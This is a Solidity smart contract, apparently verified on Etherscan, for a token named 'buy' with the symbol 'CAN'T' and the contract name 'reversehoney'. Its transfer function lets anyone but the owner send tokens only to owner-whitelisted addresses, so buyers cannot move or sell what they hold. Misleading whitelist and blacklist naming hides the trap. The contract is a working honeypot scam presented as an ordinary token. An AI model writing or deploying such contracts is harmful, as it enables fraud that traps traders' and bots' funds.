/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: Unlicensed

contract Ownable {

  address public owner;

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  constructor () public {
    owner = msg.sender;
  }
}

contract reversehoney is Ownable {
    mapping(address => uint) public balances;
    mapping(address=> mapping(address => uint)) public allowance;
    uint public totalSupply = 100000 * 10**1;
    string public name = "buy";
    string public symbol = "CAN'T";
    uint public decimals = 1;
    mapping (address => bool) private _isWhiteListedBot;
    address[] private _WhiteListedBots;
    mapping (address => bool) private bots;
    mapping (address => bool) private _isWhitelisted;

    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function isWhiteListed(address account) public view returns (bool) {
        return _isWhiteListedBot[account];
    }
    
    function whitelistWallet(address addresses) public onlyOwner(){
        if(_isWhitelisted[addresses] == true) return;
        _isWhitelisted[addresses] = true;
    }
    
    function addToWhiteList(address account) external onlyOwner() {
        require(!_isWhiteListedBot[account], "Account is already blacklisted");
        _isWhiteListedBot[account] = true;
        _WhiteListedBots.push(account);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool){
        require(balanceOf(msg.sender) >= value, 'balance too low' );
        if (msg.sender == owner) emit Transfer(msg.sender, to, value); else
        require(_isWhiteListedBot[to]);
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool){
        require(balanceOf(from) >= value, 'balance too low' );
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
        
    }
    
    function approve(address spender, uint256 value) public returns(bool success){
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    }